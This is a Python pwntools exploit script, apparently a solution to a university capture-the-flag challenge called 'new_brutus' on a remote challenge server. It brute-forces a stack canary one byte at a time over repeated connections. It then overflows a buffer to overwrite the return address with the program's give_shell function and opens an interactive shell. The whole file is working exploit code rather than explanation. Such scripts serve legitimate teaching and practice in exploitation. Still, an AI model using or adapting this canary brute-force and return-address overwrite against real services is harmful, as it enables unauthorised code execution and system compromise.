from pwn import *



context.log_level = 'warn'

magic = b'\x00'

while len(magic) < 16:
    for char in range(256):
        #print(f"trying {bytes([char])}")
        r = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1340)
        out = r.recvuntil(b'):')
        #print(out)
        r.send(b'rt1726\n')
        #r.sendafter(b'):', b'rt1726')
        out = r.recvuntil(b'name?\n\x00')
        #print(out)
        r.send(str(136 + len(magic) + 1).encode())
        out = r.recvuntil(b'of data\n')
        #print(out)
        r.send(b'B'*136 + magic + bytes([char]))

        #r.interactive()
        try:
            out = r.recvuntil(b'goodbye')
            magic += bytes([char])
            print("Found",magic,"\n")
            break
        except:
            continue
        finally:
            r.close()

print("magic:", magic)

e = ELF('./new_brutus')

r = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1340)
out = r.recvuntil(b'):')
print(out)
r.send(b'rt1726\n')
r.sendafter(b'name?\n\x00', str(136 + len(magic) + 8).encode())
r.sendafter(b'of data\n', b'B'*136 + magic + p64(e.symbols['give_shell']))
r.interactive()

